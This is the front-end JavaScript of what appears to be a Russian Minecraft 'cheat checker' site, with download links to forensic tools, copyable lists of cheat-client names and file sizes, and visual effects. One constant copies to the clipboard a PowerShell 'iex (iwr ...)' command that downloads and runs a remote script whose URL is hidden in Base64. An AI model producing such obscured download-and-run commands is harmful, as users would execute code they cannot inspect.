// ============================================================
// Cheat Checker — app logic
// ============================================================

// Mark JS as loaded — enables reveal animations via CSS
document.documentElement.classList.add('js-loaded');

// Links configuration - edit URLs here
const downloadLinks = {
    'ocean': 'https://anticheat.ac/downloads',
    'anydesk': 'https://anydesk.com/ru/downloads',
    'rustdesk-main': 'https://rustdesk.com/',
    'rustdesk-alt': 'https://rustdesk.com/',
    'everything': 'https://www.voidtools.com/',
    'journaltrace': 'https://github.com/ponei/JournalTrace/releases/tag/1.0',
    'shellbags': '#',
    'processhacker': 'https://processhacker.sourceforge.io/',
    'systeminformer': 'https://systeminformer.sourceforge.io/',
    'usbdrivelog': 'https://www.nirsoft.net/utils/usb_drive_log.html',
    'usbdeview': 'https://www.nirsoft.net/utils/usb_devices_view.html',
    'executedprogramslist': 'https://www.nirsoft.net/utils/executed_programs_list.html',
    'winprefetchview': 'https://www.nirsoft.net/utils/win_prefetch_view.html',
    'lastactivityview': 'https://www.nirsoft.net/utils/last_activity_view.html',
    'opensavefilesview': 'https://www.nirsoft.net/utils/open_save_files_view.html',
    'funmodanalyzer': '#',
    'checker': 'funtime-chk.bat'
};

// Initialize download buttons
document.querySelectorAll('.btn-download').forEach(btn => {
    const program = btn.getAttribute('data-program');
    if (downloadLinks[program]) {
        btn.href = downloadLinks[program];
        btn.target = '_blank';
        btn.rel = 'noopener';
    }
    btn.addEventListener('click', (e) => {
        if (btn.href === '#' || btn.href.endsWith('#')) {
            e.preventDefault();
            alert('Ссылка на скачивание будет добавлена позже');
        }
    });
});

// PowerShell command for installation (Base64 encoded URL)
const powerShellCommand = "iex (iwr -UseBasicParsing ([System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL2thZ2hvaG9wLWdpZi9jaGsvbWFpbi9pbml0aWFsaXphdGlvbi5wczE='))))";

// ============================================================
// Copy text functions
// ============================================================
function copyText(text, elementId) {
    navigator.clipboard.writeText(text).then(() => {
        const note = document.getElementById(elementId);
        note.style.display = 'block';
        setTimeout(() => { note.style.display = 'none'; }, 3000);
    }).catch(() => {
        const note = document.getElementById(elementId);
        note.textContent = 'Ошибка копирования. Скопируйте вручную!';
        note.style.display = 'block';
        setTimeout(() => { note.style.display = 'none'; }, 3000);
    });
}

// Text data
const textSize = 'size:2263|size:5266|size:6515|size:6770|size:6778|size:7016|size:7218|size:7803|size:7891|size:9327|size:10283|size:10605|size:10958|size:11554|size:16541|size:17308|size:17339|size:18180|size:18527|size:18587|size:18734|size:19266|size:20578|size:20583|size:20639|size:20883|size:21161|size:21234|size:21664|size:22036|size:22861|size:26247|size:27546|size:27809|size:28084|size:28439|size:29304|size:29567|size:30279|size:31549|size:31607|size:34449|size:34669|size:35971|size:35993|size:38149|size:39017|size:39321|size:40142|size:42782|size:47159|size:48242|size:50828|size:51212|size:52426|size:54088|size:59381|size:62782|size:65316|size:65486|size:65765|size:66659|size:67491|size:68794|size:69757|size:72334|size:74105|size:80751|size:88896|size:95530|size:98811|size:100523|size:100799|size:101297|size:101571|size:101703|size:102297|size:102733|size:103761|size:104954|size:105623|size:105672|size:112386|size:120640|size:138417|size:143006|size:143597|size:143600|size:147329|size:147873|size:151762|size:153937|size:156722|size:156779|size:166677|size:169718|size:173698|size:183634|size:183651|size:192156|size:202720|size:257482|size:263070|size:267746|size:274865|size:300286|size:334588|size:343169|size:350629|size:409616|size:410358|size:517248|size:519731|size:532826|size:539151|size:556494|size:597406|size:636621|size:640838|size:878781|size:925493|size:1077149|size:1165063|size:1181556|size:1444714|size:1471429|size:1569093|size:1822841|size:3113569|size:3425801|size:3541075|size:3541138|size:3642292|size:3684385|size:4642998|size:5630483|size:7052171|size:7059952|size:22258750|size:25704986|size:26179274|size:26691896 *.jar';

const textSizes2 = 'size:9951744|size:24536064|size:15438336|size:6229504|size:6573056|size:7187456|size:7969792|size:1562249|size:1672329|size:1677449|size:1680521|size:147329|size:138351|size:202720|size:7788032|size:22885|size:23810|size:138351|size:147329|size:7988736|size:3711166|size:3697285|size:3712014|size:5641728|size:4413440|size:114974|size:111866|size:274865|size:1820884|size:5007380|size:6944256|size:5934592|size:2545664|size:2108662|size:1961742|size:3684385|size:5143837|size:4413440|size:116689|size:1968128|size:8011776|size:1883602|size:5918208|size:1897269|size:31445308|size:24390144|size:25158656|size:2023236|size:16836288|size:88065933|size:197933122|size:2258533|size:2305645|size:2372788|size:18764384|size:9400174|size:2363704|size:15445581|size:2373676|size:138351|size:7788032|size:22885|size:23810|size:7988736|size:3711166|size:3697285|size:3712014|size:5641728|size:4413440|size:111866|size:1820884|size:5007380|size:6944256|size:5934592|size:2545664|size:2108662|size:1961742|size:3684385|size:5143837|size:1968128|size:8011776|size:1883602|size:6533121|size:16629226|size:28107997|size:8249687|size:5524900|size:140200|size:132133|size:110439|size:6244043|size:6867367|size:43883|size:514855|size:479296|size:9530356|size:355527744|size:1819289|size:1897269|size:16855568|size:16964112|size:2023236|size:5918208|size:31445308|size:24390144|size:10657176|size:460288|size:19521024|size:15076480|size:7204864|size:1613824|size:1499136|size:1488896|size:9332326|size:9400174|size:10071288|size:9400174|size:10071288|Baritone|Nursultan';

const textClients = 'impact | вурст | bleachhack | аристоис | хузуни | skillclient | инерция | арес | сигма | метеор | ликвидбоунс | нурик | нурсултан | целестиал | калестиал | селка | дорого | neverhook | отлично | wexside | дикий клиент | фарш | deadcode | акриен | головоломка | будущее | джессика | dreampool | норулес | конас | ричклиент | rusherhack | thunderhack | moonhack | судный день | nightware | рикардо | extazyy | троксилл | защита от утечки | арбуз | .akr | .wex | даунтиблят | переименовать*ме*пожалуйста | отредактируйте меня | takker | fuzeclient | wisefolder| flauncher | vec.dll | USBOblivion.exe | Feather | delta | venus | baritone | спам -бот | Clean cut | spam_bot | inventory_walk | player_highlighter | aimbot | freecam | bedrock_breaker_mode | viaversion | double_hotbar | elytra_swap | armor_hotswap | smart_moving | chest | savesearcher | topkautobuy | топкаавтобуй | tweakeroo | mob_hitbox | librarian_trade_finder | sacurachorusfind | автоатака | entity_outliner | invmove | viabackwards | viarewind | viafabric | viaforge | viaproxy | vialoader | viamcp | hitbox | elytrahack | DiamondSim | ForgeHax | клиентские команды | Настройки управления | SwingThroughGrass | CutThrough | Haruka | NewLauncher | Blade | Hachclient | Inertia | Fluger | Exloader | CatLean';

function copyPowerShellCommand() { copyText(powerShellCommand, 'ps-note'); }
function copyTextSize1() { copyText(textSize, 'size-note-1'); }
function copyTextSize2() { copyText(textSizes2, 'size-note-2'); }
function copyTextClients() { copyText(textClients, 'client-note'); }

// ============================================================
// UI: nav, progress, cursor glow, burger
// ============================================================
const nav = document.getElementById('nav');
const progress = document.getElementById('progress');

window.addEventListener('scroll', () => {
    nav.classList.toggle('scrolled', window.scrollY > 40);
    const h = document.documentElement.scrollHeight - window.innerHeight;
    progress.style.width = (h > 0 ? (window.scrollY / h) * 100 : 0) + '%';
}, { passive: true });

// Cursor glow follows mouse
const cursorGlow = document.getElementById('cursorGlow');
window.addEventListener('mousemove', (e) => {
    document.body.classList.add('has-mouse');
    if (cursorGlow) {
        cursorGlow.style.transform = `translate(${e.clientX}px, ${e.clientY}px)`;
    }
}, { passive: true });

document.addEventListener('mousemove', (e) => {
    const card = e.target.closest('.tilt');
    if (!card) return;
    const r = card.getBoundingClientRect();
    card.style.setProperty('--mx', ((e.clientX - r.left) / r.width * 100) + '%');
    card.style.setProperty('--my', ((e.clientY - r.top) / r.height * 100) + '%');
}, { passive: true });

// Burger menu (mobile)
const burger = document.getElementById('burger');
const navLinks = document.getElementById('navLinks');
if (burger && navLinks) {
    burger.addEventListener('click', () => {
        const open = navLinks.classList.toggle('open');
        burger.classList.toggle('open', open);
        burger.setAttribute('aria-expanded', open);
    });
    navLinks.querySelectorAll('a').forEach(a => a.addEventListener('click', () => {
        navLinks.classList.remove('open');
        burger.classList.remove('open');
    }));
}

// Smooth scroll for anchor links
document.querySelectorAll('a[href^="#"]').forEach(anchor => {
    anchor.addEventListener('click', function (e) {
        const href = this.getAttribute('href');
        if (href !== '#') {
            const target = document.querySelector(href);
            if (target) {
                e.preventDefault();
                target.scrollIntoView({ behavior: 'smooth', block: 'start' });
            }
        }
    });
});

// ============================================================
// Reveal on scroll
// ============================================================
const revealObserver = new IntersectionObserver((entries) => {
    entries.forEach(entry => {
        if (entry.isIntersecting) {
            entry.target.classList.add('in');
            revealObserver.unobserve(entry.target);
        }
    });
}, { threshold: 0.12, rootMargin: '0px 0px -40px 0px' });

document.querySelectorAll('.reveal, .section-head').forEach(el => revealObserver.observe(el));

// ============================================================
// Click sound (WebAudio) + ripple
// ============================================================
let audioCtx = null;
function playClickSound() {
    try {
        if (!audioCtx) audioCtx = new (window.AudioContext || window.webkitAudioContext)();
        if (audioCtx.state === 'suspended') audioCtx.resume();
        const ctx = audioCtx;
        const osc = ctx.createOscillator();
        const gain = ctx.createGain();
        osc.type = 'sine';
        osc.frequency.setValueAtTime(620, ctx.currentTime);
        osc.frequency.exponentialRampToValueAtTime(300, ctx.currentTime + 0.08);
        gain.gain.setValueAtTime(0.12, ctx.currentTime);
        gain.gain.exponentialRampToValueAtTime(0.001, ctx.currentTime + 0.1);
        osc.connect(gain).connect(ctx.destination);
        osc.start();
        osc.stop(ctx.currentTime + 0.1);
    } catch (e) { /* audio not available */ }
}

document.addEventListener('click', (e) => {
    if (e.target.closest('.btn, .btn-download, .btn-copy, .nav-links a, .logo')) {
        playClickSound();
    }
    const btn = e.target.closest('.btn, .btn-download, .btn-copy');
    if (!btn) return;
    const ripple = document.createElement('span');
    ripple.className = 'ripple';
    const rect = btn.getBoundingClientRect();
    const size = Math.max(rect.width, rect.height);
    ripple.style.width = ripple.style.height = size + 'px';
    ripple.style.left = (e.clientX - rect.left - size / 2) + 'px';
    ripple.style.top = (e.clientY - rect.top - size / 2) + 'px';
    btn.appendChild(ripple);
    setTimeout(() => ripple.remove(), 600);
});

// ============================================================
// Particles background
// ============================================================
(function () {
    const canvas = document.getElementById('particles');
    if (!canvas) return;
    const ctx = canvas.getContext('2d');
    let particles = [];
    const mouse = { x: -9999, y: -9999 };
    const COLORS = ['255, 45, 85', '255, 122, 24', '255, 90, 60'];

    function resize() {
        canvas.width = window.innerWidth;
        canvas.height = window.innerHeight;
    }
    window.addEventListener('resize', resize);
    resize();

    window.addEventListener('mousemove', (e) => { mouse.x = e.clientX; mouse.y = e.clientY; }, { passive: true });

    class Particle {
        constructor() { this.reset(true); }
        reset(initial) {
            this.x = Math.random() * canvas.width;
            this.y = initial ? Math.random() * canvas.height : canvas.height + 10;
            this.r = Math.random() * 1.8 + 0.5;
            this.speed = Math.random() * 0.35 + 0.1;
            this.vx = (Math.random() - 0.5) * 0.25;
            this.color = COLORS[Math.floor(Math.random() * COLORS.length)];
            this.alpha = Math.random() * 0.45 + 0.2;
        }
        update() {
            this.y -= this.speed;
            this.x += this.vx;
            const dx = this.x - mouse.x, dy = this.y - mouse.y;
            const d2 = dx * dx + dy * dy;
            if (d2 < 120 * 120 && d2 > 0.01) {
                const d = Math.sqrt(d2);
                this.x += (dx / d) * 0.6;
                this.y += (dy / d) * 0.6;
            }
            if (this.y < -10 || this.x < -10 || this.x > canvas.width + 10) this.reset(false);
        }
        draw() {
            ctx.beginPath();
            ctx.arc(this.x, this.y, this.r, 0, Math.PI * 2);
            ctx.fillStyle = `rgba(${this.color}, ${this.alpha})`;
            ctx.fill();
        }
    }

    function spawn() {
        const count = Math.min(80, Math.floor(canvas.width / 20));
        particles = [];
        for (let i = 0; i < count; i++) particles.push(new Particle());
    }
    spawn();
    window.addEventListener('resize', spawn);

    function animate() {
        ctx.clearRect(0, 0, canvas.width, canvas.height);
        for (let i = 0; i < particles.length; i++) {
            const p = particles[i];
            p.update();
            p.draw();
            for (let j = i + 1; j < particles.length; j++) {
                const q = particles[j];
                const dx = p.x - q.x, dy = p.y - q.y;
                const d = dx * dx + dy * dy;
                if (d < 110 * 110) {
                    ctx.beginPath();
                    ctx.moveTo(p.x, p.y);
                    ctx.lineTo(q.x, q.y);
                    ctx.strokeStyle = `rgba(255, 45, 85, ${0.1 * (1 - d / (110 * 110))})`;
                    ctx.lineWidth = 1;
                    ctx.stroke();
                }
            }
        }
        requestAnimationFrame(animate);
    }
    animate();
})();

// Footer year
const yearEl = document.getElementById('year');
if (yearEl) yearEl.textContent = new Date().getFullYear();
